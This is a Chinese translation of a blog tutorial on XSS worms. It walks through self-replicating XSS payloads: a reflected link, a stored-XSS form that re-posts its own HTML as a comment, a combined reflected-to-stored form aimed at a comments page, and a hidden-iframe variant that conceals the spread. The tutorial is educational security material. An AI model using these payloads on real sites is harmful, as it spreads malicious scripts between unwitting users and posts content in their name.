翻译自以下三篇文章
http://brutelogic.com.br/blog/genesis-xss-worm-part-i/
http://brutelogic.com.br/blog/genesis-xss-worm-part-ii/
http://brutelogic.com.br/blog/genesis-xss-worm-part-iii/

XSS攻击最大的危害在于可能在一个系统中的用户间互相感染，以致整个系统的用户沦陷。能够造成这种危害的脚本我们称之为xss蠕虫

为了更好的理解为xss蠕虫的工作原理，我们需要开始一段崭新的旅程去了解构造自我复制的代码所需要的技术

出于教学目的，我们将仅仅以最简单的代码实例做讲解。 所以我们尽可能避免使用XHR等js过程。

让我们来看看最简单的一个自我复制的反射型XSS实例。它仅仅能够在页面注入一个链接，打开这个链接将在新的标签页中注入同样的xss语句。

```
<a href target=_blank>click</a>
```

可以在[这里][1]尝试一下。

现在我们来看一个稍微复杂一些的例子。[这个][2]页面用于发送评论，并且存在存储型xss。
如果我们在评论中插入如下代码

```
<form method=post onclick=elements[0].value=outerHTML;submit()>
<input type=hidden name=comment>click me!</form>
```

这里注入了一个表格，使用post方法发送comment参数。每当onclick方法被触发时，它会将表格中的第一个元素的value填充为整个form标签内的html代码（包括form标签本身）这样每当有人点击click me!我们就能不断的发送这条评论到评论页面中，也就完成了自我复制。

对于很少有用户交互的xss向量，我们可以使用onmouseover事件或者类似的css trick来增加触发蠕虫的可能性。

尽管上面这个例子看起来很有趣，但是实际上一般评论页面都不会允许在评论中插入一个表格，在反射型xss中更有可能触发，但是这样造成的危害并不大，所以为了造成实际危害，我们需要结合反射型XSS与存储型XSS。

下面的一段代码将被插入到一个反射型xss中。

```
<form method=post action="//brutelogic.com.br/tests/comments.php"
onclick="elements[0].value='<a/href='%2BURL%2B'>link</a>';submit()">
<input type=hidden name=comment>click me!</form>
```

当click me被点击时，它将向comments.php post数据，完成发送评论的操作。和之前的html代码不同的是，他post的comment内容不再是一个表格，而是一个链接，链接的内容指向同样的xss向量，也就是注入了蠕虫代码的的存在存储型xss的页面。链接被点击后将继续造成蠕虫传播。

为了让攻击进行的更加隐蔽，我们可以不让用户返回至comment页面，而是通过插入一个不可见的iframe，并将请求在这个不可见的iframe中打开，代码如下

```
<iframe style=display:none name=x></iframe>
<form method=post action="//brutelogic.com.br/tests/comments.php"
onclick="elements[0].value='<a/href='%2BURL%2B'>link</a>';submit()"
target=x><input type=hidden name=comment>click me!</form>
```

在这里[尝试][3]。

下一部分中，我们将做一个独特的实验，即xss在传统社交网络中的不同用户间的传播是如何进行的。


  [1]: http://brutelogic.com.br/webgun/test.php?p=%3Ca%20href%20target=_blank%3Eclick%3C/a%3E
  [2]: http://brutelogic.com.br/tests/comments.php
  [3]: http://brutelogic.com.br/webgun/test.php?p=%3Ciframe%20style=display:none%20name=x%3E%3C/iframe%3E%3Cform%20method=post%20action=%22//brutelogic.com.br/tests/comments.php%22onclick=%22elements%5B0%5D.value=%27%3Ca/href=%27%2bURL%2b%27%3Elink%3C/a%3E%27;submit%28%29%22target=x%3E%3Cinput%20type=hidden%20name=comment%3Eclick%20me!%3C/form%3E



